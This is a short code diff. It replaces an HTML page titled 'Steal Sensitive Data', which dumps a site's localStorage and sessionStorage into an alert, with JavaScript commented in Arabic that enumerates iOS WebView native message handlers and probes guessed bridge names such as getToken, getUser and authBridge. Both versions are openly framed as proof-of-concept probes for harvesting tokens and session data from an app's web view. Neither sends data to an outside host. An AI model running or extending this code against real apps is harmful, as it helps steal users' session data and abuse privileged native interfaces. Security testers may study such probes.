@@ -1,31 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Steal Sensitive Data</title>
-  <script>
-    window.onload = function() {
+// محاولة طباعة جميع الجسور المتاحة
+console.log("🔍 جسور متاحة:");
+console.log(window.webkit?.messageHandlers);
+
+// طباعة أسماء كل الجسور (لو موجودة)
+if (window.webkit?.messageHandlers) {
+  Object.keys(window.webkit.messageHandlers).forEach(name => {
+    console.log("📡 Bridge Detected:", name);
+  });
+} else {
+  console.log("❌ لا يوجد جسور واضحة");
+}
+
+
+const guessNames = [
+  "getUser", "getToken", "getProfile", "grabUser",
+  "nativeBridge", "iosBridge", "authBridge", "sessionBridge"
+];
+
+guessNames.forEach(name => {
   try {
-    let allData = {};
-
-    for (let i = 0; i < localStorage.length; i++) {
-      let key = localStorage.key(i);
-      allData[`localStorage:${key}`] = localStorage.getItem(key);
-    }
-
-    for (let i = 0; i < sessionStorage.length; i++) {
-      let key = sessionStorage.key(i);
-      allData[`sessionStorage:${key}`] = sessionStorage.getItem(key);
-    }
-
-    alert(JSON.stringify(allData, null, 2));
-  } catch(e) {
-    alert('Error: ' + e.message);
+    window.webkit.messageHandlers[name].postMessage("probe");
+    console.log("🧪 جربنا الجسر:", name);
+  } catch (e) {
+    console.log("❌ مفيش جسر بالاسم:", name);
   }
-};
-
-  </script>
-</head>
-<body>
-  <h1>Fetching sensitive data...</h1>
-</body>
-</html>
+});
